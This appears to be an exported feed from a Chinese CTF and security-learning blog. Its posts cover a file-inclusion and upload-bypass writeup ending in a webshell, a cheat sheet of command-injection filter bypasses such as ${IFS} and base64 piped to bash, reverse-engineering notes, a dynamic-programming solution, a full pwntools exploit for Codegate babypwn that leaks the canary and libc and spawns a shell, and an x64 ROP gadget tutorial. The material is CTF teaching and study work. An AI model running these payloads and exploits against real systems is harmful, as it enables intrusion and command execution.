输入1ls$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/ 得到：1this_pag0_is_F1a9.php 输入：1cat$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/* 得到：1flag&#123;sQ1_1NJEct_coMMond_eXEC&#125; 或者直接访问:1http://218.76.35.74:20130/9ef89ad913e848b64b73e3aa721e44e4/this_pag0_is_F1a9.php]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-Document-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup%2F</url>
      <content type="text"><![CDATA[php伪协议 文件读取 文件上传绕过 apache解析漏洞 题目1http://218.76.35.74:20129 Solution查看源代码：12345678910&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- include.php --&gt;&lt;/body&gt;&lt;/html&gt; 发现有include.php，访问：1http://218.76.35.74:20129/include.php 提示 the parameter is file! :) 。同时查看源代码有upload.php，是个上传页面。 利用php伪协议读取源码。1http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=include include.php:123456789101112131415161718&lt;html&gt;Tips: the parameter is file! :)&lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET["file"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,"..") !== FALSE || strlen($file)&gt;=70) &#123; echo "&lt;p&gt; error! &lt;/p&gt;"; &#125; else &#123; include($file.'.php'); &#125; &#125;?&gt; 读取upload源码：1http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=upload upload.php:12345678910111213141516171819202122232425&lt;form action="" enctype="multipart/form-data" method="post"name="upload"&gt;file:&lt;input type="file" name="file" /&gt;&lt;br&gt;&lt;input type="submit" value="upload" /&gt;&lt;/form&gt;&lt;?phpif(!empty($_FILES["file"]))&#123; echo $_FILES["file"]; $allowedExts = array("gif", "jpeg", "jpg", "png"); @$temp = explode(".", $_FILES["file"]["name"]); $extension = end($temp); if (((@$_FILES["file"]["type"] == "image/gif") || (@$_FILES["file"]["type"] == "image/jpeg") || (@$_FILES["file"]["type"] == "image/jpg") || (@$_FILES["file"]["type"] == "image/pjpeg") || (@$_FILES["file"]["type"] == "image/x-png") || (@$_FILES["file"]["type"] == "image/png")) &amp;&amp; (@$_FILES["file"]["size"] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts)) &#123; move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]); echo "file upload successful!Save in: " . "upload/" . $_FILES["file"]["name"]; &#125; else &#123; echo "upload failed!"; &#125;&#125;?&gt; 随手上传了一个 god4.php.jpg 访问:1http://218.76.35.74:20129/upload/god4.php.jpg 被解析了，应该是因为apache的缘故，不识别jpg，然后向前递归解析了php。既然能解析，那就用菜刀连上去： 在虚拟终端中：1find / | grep flag 然后发现有：1/etc/.sshkey/flag.txt 得到flag:12[/var/www/html/upload/]$ cat /etc/.sshkey/flag.txt7F5A58DFC54CFAC9903FE85D92703787 这题也有多种解法，因为在include.php中可以发现，没有对zip或者phar协议等进行过滤，可以利用这些协议进行直接的文件包含。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[命令执行的一些绕过技巧]]></title>
      <url>%2F2017%2F08%2F15%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
      <content type="text"><![CDATA[命令执行的一些绕过技巧已收录至: WAF-Bypass 多条命令法一： 逻辑运算符绕过escapeshellcmd法一：win下执行bat1234567&lt;?php$command = 'dir '.$_POST['dir'];$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents('out.bat',$escaped_command);system('out.bat');?&gt; 执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。payload:1dir=../ %1a whoami 法二：宽字节注入php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。1escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;); 之后该语句会变成1echo 繺;id 从而实现 id 命令的注入。 空格过滤法一： ${IFS}payload1:1234ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;flagnice day payload2:12ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;$9flagnice day payload3:12ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day 法二： 重定向符&lt;&gt;payload1：12ubuntu@VM-207-93-ubuntu:~$ cat&lt;&gt;flagnice day payload2：12ubuntu@VM-207-93-ubuntu:~$ cat&lt;flagnice day 黑名单绕过法一： 拼接12ubuntu@VM-207-93-ubuntu:~$ a=c;b=at;c=flag;$a$b $cnice day 法二： 利用已存在的资源从已有的文件或者环境变量中获得相应的字符。 法三： base64编码payload1:12ubuntu@VM-207-93-ubuntu:~$ `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`nice day payload2:12ubuntu@VM-207-93-ubuntu:~$ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashnice day 法四： 单引号、双引号payload1:12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at flagnice day payload2:12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&quot;&quot;agnice day payload3:12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&apos;&apos;agnice day 法五：反斜线 \payload:12ubuntu@VM-207-93-ubuntu:~$ c\at fl\agnice day 无回显长度限制12345&lt;?phpif(strlen($_GET[test])&lt;8)&#123;echo shell_exec($_GET[test]);&#125;?&gt; 文件构造payload1:1a&gt;wget payload2:11&gt;wget payload3:1&gt;wget 将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。. LINUX下一些已有字符 ${PS2} 对应字符 ‘&gt;’ ${PS4} 对应字符 ‘+’ ${IFS} 对应 内部字段分隔符 ${9} 对应 空字符串 工具 shelling Refference PHP绕过open_basedir列目录的研究 eval长度限制绕过 &amp;&amp; PHP5.6新特性 关于lnmp目录禁止执行的绕过与正确方法 一些不包含数字和字母的webshell php webshell分析和绕过waf技巧 【技术分享】命令执行和绕过的一些小技巧 浅谈CTF中命令执行与绕过的小技巧 Mathias:命令执行的bypass技巧]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[逆向学习笔记（一）]]></title>
      <url>%2F2017%2F08%2F14%2F%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
      <content type="text"><![CDATA[跟着《加密与解密》学习。 第一章：基础知识文本字符 字节存储顺序与CPU有关。 Big-Endian: 高位字节存入低地址，低位字节存入高地址，依次排列。 Little-Endian： 低位字节存入高地址，高位字节存入高地址，反序排列。 ASCII 与 Unicode字符集 ASCII: 127以上的部分不统一。8位。 Unicode： ASCII字符编码的扩展。在win中用两个字节进行编码，亦称宽字节编码(Widechars)。使用0~65535之间的双字节无符号整数对每个字节编码。所有字符均为16位。 Windows操作系统WinAPI简介 略 常用Win32API函数 API函数区分字符集： A表示ANSI，W表示Widechars即Unicode。 常用的API函数： hmemcpy() : win16 API函数。将内存某块数据拷贝到另一个地方。 GetWindowText（）：USER32.DLL中。取得一个窗体的标题文字或一个文本控件的内容。 GetWindowTextA GetWindowTextW GetDlgItem（）： 获取指定对话框的句柄。 GetDlgItemText（）: 获取对话框文本。 GetDlgItemTextA GetDlgItemTextW GetDlgItemInt（） ： 获取对话框整数值。 MessageBox（）：USER32.DLL中，创建和显示信息框。 MessageBoxA MessageBoxW 句柄：Windows标识，由应用程序简历或使用的对象所使用的一个唯一的整数值。 Windows消息机制 消息(Message)驱动式系统。 消息队列：系统消息队列，应用程序消息队列。 常用的Windows消息函数： SendMessage（）函数 WM_COMMAND消息 WM_DESTORY WM_GETTEXT WM_QUIT 保护模式简介 三种模式： 实模式，保护模式，虚拟86模式。当前系统主要运行在保护模式下。 虚拟内存 保护模式的权限级别 认识PE格式 文件分成不同的区块： .text : 代码段 .rdata : 运行期只读数据 .data : 初始化的数据块 .idata : 包含其他外来DLL的函数及数据信息，即输入表。 .rsrc : 包含模块的全部资源 PE相关名词解释： 入口点(Entry Point) ： 程序执行时的第一行代码 文件偏移地址(File Offset) : PE文件在磁盘上时各数据的地址。文件偏移地址从PE文件的第一个字节开始计数，起始值为0 虚拟地址（Virtual Address， VA）: 程序访问存储器所使用的逻辑地址。又称内存偏移地址(Memory Offset)。可写成“段选择子：偏移量”的形式。 基地址（ImageBase）：文件执行时被映射到指定内存地址中，这个初始内存地址即为基地址。由PE文件本身设定。 第二章 动态分析技术OllDbg 界面 反汇编面板窗口 信息面板窗口 数据面板窗口 寄存器面板窗口 堆栈面板窗口 配置 界面设置 调试设置 加载符号文件 加载右键菜单 加载程序 创建进程 attach进程 基本操作 F7 ： 单步步进，遇到CALL 跟进 F8 ： 单步步入，遇到CALL 路过，不跟进 Ctrl+ F9 : 直到ret指令时中断 Alt + F9 : 从系统领空回到应用程序领空 F9 ： 运行程序 F2 ： 设置断点 保存修改后的文件： 右键 Copy to executable/Selection Alt+M ： 显示内存 断点INT3断点int3断点，机器码为CCh。当被调试进程执行INT3指令导致一个异常时，调试器捕捉异常并停下来。好处是可以下无数个，但缺点是改变了源程序指令，容易被检测到。检测方法为：取得检测函数的地址，读取第一个字节是否为cc。 硬件断点与DRx调试器相关。DRx调试器一共有八个。 DR0 ~ DR3 : 调试地址寄存器，保存需要监视的地址。 DR4 ~ DR5 : 未知 DR6 : 调试寄存器组状态寄存器 DR7 : 调试寄存器组控制寄存器 DR0 ~ DR3来设定地址，DR7设置状态，最多只能设置4个断电。优点速度快，可用于替代CC断点。 内存断点对所设的地址设置为不可访问/不可写属性。当访问/写入时产生异常，ollydbg捕获异常后比较是不是断点地址，若是则中断。缺点：慢。不修改源代码，在遇到代码校验时，并且硬件断点失灵的时候，可以用内存断点来代替。数量为1个。 内存访问一次性断点按Alt+M显示内存后，有许多段。在相应的段上单击右键，选择Set break on access，会对整个内存块设置该类断点。这是一次性断点，当所在段被读取或被执行后中断，中断完成后断点将被删除。 消息断点条件断点条件记录断点第三章 静态分析技术文件类型分析 PEID工具 用处：检测大多数编译语言、病毒和加密的壳 原理：被加壳的程序处理过的程序在壳里会留下相关加壳软件的信息。 参考 Fileinfo]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[WAF-Bypass] Mysql 注入绕过姿势]]></title>
      <url>%2F2017%2F08%2F14%2FWAF-Bypass-Mysql-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[Codegate 2017 Qual-babypwn-writeup]]></title>
      <url>%2F2017%2F08%2F12%2FCodegate-2017-Qual-babypwn-writeup%2F</url>
      <content type="text"><![CDATA[Codegate 2017 Qual-babypwn-writeup 分析基本功能题目提供了一个32位的程序。参数传递用栈来进行。用gdb载入后看一下保护措施，如下：12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE 用IDA打开进行分析。文件实现了一个socket服务。其真正的服务函数如下：123456789101112131415161718192021222324252627282930313233343536373839int sub_8048A71()&#123; int v1; // [sp+1Ch] [bp-3Ch]@2 char v2; // [sp+24h] [bp-34h]@1 int v3; // [sp+4Ch] [bp-Ch]@1 v3 = *MK_FP(__GS__, 20); memset(&amp;v2, 0, 0x28u); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; sub_80488B1("\n===============================\n"); sub_80488B1("1. Echo\n"); sub_80488B1("2. Reverse Echo\n"); sub_80488B1("3. Exit\n"); sub_80488B1("===============================\n"); v1 = sub_804895A(); if ( v1 != 1 ) break; sub_80488B1("Input Your Message : "); sub_8048907(&amp;v2, 0x64u); sub_80488B1(&amp;v2); &#125; if ( v1 != 2 ) break; sub_80488B1("Input Your Message : "); sub_8048907(&amp;v2, 0x64u); sub_80489C8(&amp;v2); sub_80488B1(&amp;v2); &#125; if ( v1 == 3 ) break; sub_80488B1("\n[!] Wrong Input\n"); &#125; return *MK_FP(__GS__, 20) ^ v3;&#125; 整体上看，实现了三个功能，第一个是读入（sub_8048907）输入的数据并输出来（sub_8048907）。第二个功能是Reverse Echo，好像没啥用。第三个功能是退出。 在Echo功能的sub_8048907(&amp;v2, 0x64u);中：1234567891011ssize_t __cdecl sub_8048907(void *a1, size_t a2)&#123; int v2; // ST2C_4@1 ssize_t result; // eax@1 int v4; // ecx@1 v2 = *MK_FP(__GS__, 20); result = recv(fd, a1, a2, 0); v4 = *MK_FP(__GS__, 20) ^ v2; return result;&#125; 将读入的字符通过recv()函数拷贝到数组v2中，读入的字符长度可以达到0x64即100个字节。而数组v2所在的位置为 bp-34h ，0x34 = 52。所以很明显这里存在栈溢出。但因为开了Canary保护，因此如果要利用栈溢出，就需要泄露Canary值或者其他技术。 接下去看输出函数sub_80488B1(&amp;v2);中：12345678910111213ssize_t __cdecl sub_80488B1(const char *a1)&#123; int v1; // ST2C_4@1 size_t v2; // eax@1 ssize_t result; // eax@1 int v4; // ecx@1 v1 = *MK_FP(__GS__, 20); v2 = strlen(a1); result = send(fd, a1, v2, 0); v4 = *MK_FP(__GS__, 20) ^ v1; return result;&#125; 将数组v2的内容发送出去，发送数据的长度由strlen()指定。 泄露canary接下来我们考虑如何泄露Canary值。Canary值的第一个字节总是\x00，加上是小端序。数组v2在一开始通过memset(&amp;v2, 0, 0x28u);进行初始化。所以结合两者情况，栈的分布约莫下；1&apos;\x00&apos; * 0x28 + ? + ? + ? + `\x00` 当我们输入的字符个数少于0x28时，比如aaa，则v2中的第四个字符是\x00，则strlen(v2)就为3。如下：1&apos;a&apos; * 3 + &apos;\x00&apos; * 0x25 + ? + ? + ? + `\x00` 最后返回输出为字符串“aaa”。 但若我们输入的字符个数等于0x28时，由于后面的数据是canary值。此时：12&apos;a&apos; * 0x28 + ? + ? + ? + `\x00`` 对于数组v2而言，canary的第一个字节\x00成了它的结束标志。在strlen时会把canary值得长度加上，在最后返回输出时将canary的值打印出来。从而完成对canary的泄露。 泄露出canary后就该考虑如何进行栈溢出利用。程序中提供了system函数。但若要getshell，我们还需要/bin/sh字符串，及其他一些操作。 泄露libc为得到/bin/sh字符串的地址，我们可以去泄露出libc版本。考虑到有send(fd, a1, v2, 0)函数，我们只要让fd为4（默认值），a1为libc库函数的got地址，设置v2为4，第四个为0，就能够将libc库函数的地址打印出来。通过泄露几个libc库函数的地址就能得到libc版本，并利用偏移计算出/bin/sh字符串的地址。 假如我要泄露setsockopt函数的地址。可以构造payload如下：12345678910payload = &apos;A&apos; * 0x28 payload += p32(canary_value)payload += &apos;A&apos; * 8 # reach 0x28 + 4 + 8 = 52payload += &apos;A&apos; * 4 # reach retpayload += p32(send_sym_addr)payload += p32(vuln_func_addr)payload += p32(4)payload += p32(setsockopt_got_addr)payload += p32(4)payload += p32(0) 其中注意第二行使用了前面得到的canary值。然后我们加上了12个a，这样才能将返回地址覆盖为send_sym_addr的地址。根据32位程序的栈布局，接下来是send()函数调用完后的返回地址，为进一步利用，这里选择回到有漏洞的服务(8048A71)处。再接下来依次是send函数的四个参数。 在发送完payload后，我们还需要在程序选项中输入一次3，选择功能3. Exit\n,这样程序才能执行到ret，即被我们覆写了的返回地址。所以需要发送第二段payload：123r.recvuntil(&quot;Select menu &gt; &quot;)payload = &apos;3&apos;r.sendline(payload) getshell在成功获得libc版本后，现在已经有了system函数，和/bin/sh字符串，但还不能获得shell。因为程序本身是一个socket服务器，所以它的默认文件描述符不是标准输入输出流0或1，而是4，这也是前面调用send函数时第一个参数为4的原因。我们可以使用dup2函数来复制文件描述符，重定向输入输出流。 dup2函数的原型如下：1int dup2(int oldfd,int newfd); 所以对应的，在getshell之前，我们要把原本的文件描述符重定向到标准输入输出流。对应payload为：123456789101112payload = 'A' * 0x28 payload += p32(canary_value)payload += 'A' * 8 # reach 0x28 + 4 + 8 = 52payload += 'A' * 4 # reach retpayload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(0)payload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(1) exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *r = remote('127.0.0.1','8181')libc = ELF("./libc.so.6")elf = ELF("./babypwn")sh_loclibc_addr = next(libc.search("sh\x00"))setsockopt_loclibc_addr = libc.symbols['setsockopt']dup2_loclibc_addr = libc.symbols['dup2']pop_ret_addr = 0x08048b85pop_pop_ret_addr = 0x08048b84vuln_func_addr = 0x8048A71system_sym_addr = elf.symbols["system"]send_sym_addr = elf.symbols['send']setsockopt_got_addr = elf.got['setsockopt']offset_sh_setsockopt = sh_loclibc_addr - setsockopt_loclibc_addroffset_dup2_setsockopt = dup2_loclibc_addr - setsockopt_loclibc_addrlog.success("system symbols address is : " + hex(system_sym_addr))log.success("send address is : " + hex(send_sym_addr))log.info("First Stage : Leak canary value.\n")r.recvuntil("Select menu &gt; ")payload = "1"r.sendline(payload)r.recvuntil("Input Your Message : ")payload = 'b' * 0x28r.sendline(payload)canary_value = u32('\x00' + r.recv()[0x29:0x2c])log.info("Canary : %s " % hex(canary_value))r.recvuntil("Select menu &gt; ")payload = "1"r.sendline(payload)r.recvuntil("Input Your Message : ")payload = 'A' * 0x28 payload += p32(canary_value)payload += 'A' * 8 # reach 0x28 + 4 + 8 = 52payload += 'A' * 4 # reach retpayload += p32(send_sym_addr)payload += p32(vuln_func_addr)payload += p32(4)payload += p32(setsockopt_got_addr)payload += p32(4)payload += p32(0)r.sendline(payload)r.recvuntil("Select menu &gt; ")payload = '3'r.sendline(payload)setsockopt_libc_addr = u32(r.recv(4))log.success("setsockopt libc addr is : " + hex(setsockopt_libc_addr))sh_libc_addr = offset_sh_setsockopt + setsockopt_libc_addrdup2_libc_addr = offset_dup2_setsockopt + setsockopt_libc_addrr.recvuntil("Select menu &gt; ")payload = "1"r.sendline(payload)r.recvuntil("Input Your Message : ")payload = 'A' * 0x28 payload += p32(canary_value)payload += 'A' * 8 # reach 0x28 + 4 + 8 = 52payload += 'A' * 4 # reach retpayload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(0)payload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(1)payload += p32(system_sym_addr)payload += p32(0)payload += p32(sh_libc_addr)r.sendline(payload)r.recvuntil("Select menu &gt; ")payload = '3'r.sendline(payload)r.recv()r.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[hihoCoder 162周：回文字符串]]></title>
      <url>%2F2017%2F08%2F12%2FhihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
      <content type="text"><![CDATA[回文字符串。动态规划。 题目描述给定一个字符串 S ，最少需要几次增删改操作可以把 S 变成一个回文字符串？一次操作可以在任意位置插入一个字符，或者删除任意一个字符，或者把任意一个字符修改成任意其他字符。 输入字符串 S。S 的长度不超过100, 只包含’A’-‘Z’。 输出最少的修改次数。 样例输入ABAD 样例输出1 分析这题采用动态规划。 读入的字符串假设用s表示。则s[i..j]，表示从下标为i的字符到下标为j的字符所组成的字符子串（字符串下标从0开始），而s[i]表示下标为i的字符。例如，字符串“ABCD”，则s[0,2]表示字符串“ABC”，s[1]为字符“B”。 用一个二维数组dp[i][j]来保存状态，其中对于每个dp[i][j]，表示对字符串s[i..j]，使之成为回文字符串所需的最少操作。 现在考察子串s[i..j]。 第一种情况，首尾恰好相同，即 s[i] == s[j]。则对于子串s[i..j]而言，它要变成回文字符串所需的最少操作，与子串s[i-1..j-1]变成回文字符串所需的最少操作数相同。所以有 dp[i][j] = dp[i-1][j+1] 第二种情况，首尾不同，即 s[i] != s[j]。要想让子串s[i..j]变成回文字符串，我们可以利用题目提供的三种操作：增加，删除，修改。 接下来我们分情况讨论。 假设 s[i..j-1] 是回文字符串。则我们可以在s[i]之前添加上一个字符，使之匹配字符s[j]，从而让 s[i..j] 成为回文字符串。此时，dp[i][j] = dp[i][j-1] + 1。或者，我们直接删除掉字符s[j]，让 s[i..j] 变成s[i..j-1]，从而成为回文字符串，此时同样，dp[i][j] = dp[i][j-1] + 1 假设 s[i+1..j] 是回文字符串。则我们可以在s[j]之后添加一个字符，使之匹配字符s[i]，从而让 s[i..j] 成为回文字符串，此时，dp[i][j] = dp[i+1][j] + 1。或者，我们直接将字符s[i]删掉，让 s[i..j] 变成 s[i+1，j]，从而成为回文字符串，此时也有 dp[i][j] = dp[i+1][j] + 1。 假设 s[i-1..j-1] 是回文字符串。则我们可以修改s[i]，使之匹配s[j]，或者修改s[j]，使之匹配s[i]。这种情况下，有：d[i][j] = dp[i-1][j-1] + 1 以上三种情况，囊括了对字符串s[i..j]所能操作的所有情况。而为求最小操作数，只要取三种情况的最小值。 代码123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#define MAX_N 1005using namespace std;char str[MAX_N];int dp[MAX_N][MAX_N];int min_dp(int a,int b,int c)&#123; int temp = a&gt;b?b:a; return temp&gt;c?c:temp;&#125;int main()&#123; scanf("%s",str); int len = strlen(str); memset(dp, 0, sizeof(dp)); for (int i=len-1 ;i&gt;=0 ;i--)&#123; for (int j=i ;j&lt;len ;j++)&#123; if ( str[i] == str[j])&#123; dp[i][j] = dp[i+1][j-1]; &#125;else&#123; dp[i][j] = min_dp(dp[i+1][j],dp[i][j-1],dp[i+1][j-1]) + 1; &#125; &#125; &#125; &#125; printf("%d",dp[0][len-1]); return 0;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ROP学习：利用通用gadget]]></title>
      <url>%2F2017%2F08%2F09%2FROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路。 通用Gadget在x64下进行pwn时，由于参数的传递是通过寄存器来传递的，所以需要寻找gadget。有时用一些工具比如ROPgadget，使用下面的命令：1ROPgadget ---binary bin --only &quot;pop|ret&quot; 来寻找gadget。但有时候找不到可用的gadget。 但在x64的环境下，程序有调用libc.so的话，一般会有一个__libc_csu_init()函数。利用里面的gadget可以达到向函数进行传参的功能。这就是通用gadget。 以蒸米师傅的《一步一步学ROP之linux_x64篇》为例研究一下。其源代码level5.c如下：12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, "Hello, World\n", 13); vulnerable_function();&#125; 用objdump查看，习惯intel语法了所以这里加了个 -Mintel1objdump -d -Mintel level5 其中__libc_csu_init函数：12345678910111213141516171819202122232425262728293031323334353600000000004005a0 &lt;__libc_csu_init&gt;: 4005a0: 48 89 6c 24 d8 mov QWORD PTR [rsp-0x28],rbp 4005a5: 4c 89 64 24 e0 mov QWORD PTR [rsp-0x20],r12 4005aa: 48 8d 2d 73 08 20 00 lea rbp,[rip+0x200873] # 600e24 &lt;__init_array_end&gt; 4005b1: 4c 8d 25 6c 08 20 00 lea r12,[rip+0x20086c] # 600e24 &lt;__init_array_end&gt; 4005b8: 4c 89 6c 24 e8 mov QWORD PTR [rsp-0x18],r13 4005bd: 4c 89 74 24 f0 mov QWORD PTR [rsp-0x10],r14 4005c2: 4c 89 7c 24 f8 mov QWORD PTR [rsp-0x8],r15 4005c7: 48 89 5c 24 d0 mov QWORD PTR [rsp-0x30],rbx 4005cc: 48 83 ec 38 sub rsp,0x38 4005d0: 4c 29 e5 sub rbp,r12 4005d3: 41 89 fd mov r13d,edi 4005d6: 49 89 f6 mov r14,rsi 4005d9: 48 c1 fd 03 sar rbp,0x3 4005dd: 49 89 d7 mov r15,rdx 4005e0: e8 1b fe ff ff call 400400 &lt;_init&gt; 4005e5: 48 85 ed test rbp,rbp 4005e8: 74 1c je 400606 &lt;__libc_csu_init+0x66&gt; 4005ea: 31 db xor ebx,ebx 4005ec: 0f 1f 40 00 nop DWORD PTR [rax+0x0] 4005f0: 4c 89 fa mov rdx,r15 4005f3: 4c 89 f6 mov rsi,r14 4005f6: 44 89 ef mov edi,r13d 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8] 4005fd: 48 83 c3 01 add rbx,0x1 400601: 48 39 eb cmp rbx,rbp 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt; 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8] 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10] 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18] 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20] 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28] 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30] 400624: 48 83 c4 38 add rsp,0x38 400628: c3 ret 400629: 0f 1f 80 00 00 00 00 nop DWORD PTR [rax+0x0] 在《一步一步学ROP之linux_x64篇》中，利用该通用gadget的思路如下： 我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。 不过具体是怎样的一个流程，可能光看这段话不太清楚。我们根据蒸米师傅的payload1来调试一下整个ROP的过程。 ROP蒸米师傅的第一个payload，是要利用write()输出在内存中的地址，即write(1, write.got, 8)。根据64位由寄存器传参，我们要利用rop做到以下几件事： 设置rdi为1，这是第一个参数 设置rsi为 write的got地址即write.got，这是第二个参数 设置rdx为 8，这是第三个参数 成功的调用write()函数 现在利用脚本具体如下：1234567891011121314151617181920from pwn import *elf = ELF('level5')p = process('./level5')log.info(proc.pidof(p)[0])got_write = elf.got['write']print "got_write: " + hex(got_write)got_read = elf.got['read']print "got_read: " + hex(got_read)main = 0x400564payload1 = "\x00"*136payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_retpayload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]payload1 += "\x00"*56payload1 += p64(main)p.recvuntil("Hello, World\n")print "\n#############sending payload1#############\n"raw_input()p.send(payload1)raw_input() 其中log.info(proc.pidof(p)[0])用来输出process的pid，用于gdb的attach。第一个raw_input()是在发送payload之前attach上去，这样能具体的观察到发送前后内存的bain话，最后一行raw_input()是在发送payload后挂住脚本防止level5直接退出。 如图所示，进程的PID号为4597.用gdb命令gdb attach 4597后即可附加到进程上。在py脚本中按一下回车，这时会执行p.send(payload1)。接下来正式开始调试，以下命令均在gdb中进行。 第一阶段接下来我们开始正式的第一阶段的ROPpayload：123payload1 = &quot;\x00&quot;*136payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_retpayload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] 此时程序执行到read(STDIN_FILENO, buf, 512)，我们按n后，程序执行完read，将我们的payload读到了栈上。我们输入了136个0，然后是通用gadget的起始位置0x400606。 接下去继续输入n，当程序执行将到0x400563 &lt;vulnerable_function+31&gt;: ret时，可以观察到此时栈顶为0x400606。 继续输入n，程序跳到通用gadget里，开始正式的rop。 根据我们的payload：p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0)，结合上图的stack分析，可知此时的栈中数据分布如下（小端序）： 起点 +0 +1 +2 +3 +4 +5 +6 +7 对应数据 rsp 00 00 00 00 00 00 00 00 0x0 rsp+8 00 00 00 00 00 00 00 00 0x0 rsp+16 01 00 00 00 00 00 00 00 0x1 rsp+24 00 10 60 00 00 00 00 00 0x601000 rsp+32 01 00 00 00 00 00 00 00 0x1 rsp+40 00 10 60 00 00 00 00 00 0x601000 rsp+48 08 00 00 00 00 00 00 00 0x8 rsp+56 f0 05 40 00 00 00 00 00 0x4005f0 此时各寄存器的值如下： 我们继续按n，程序执行完mov rbx,QWORD PTR [rsp+0x8]，将rsp+0x8也即rsp+8地址处的数据以QWORD形式即8字节赋值给rbx，执行完后，rbx将为0。所以这里有一点要注意的，我们的payload开头是这样的：p64(0) +p64(0) + p64(1) + 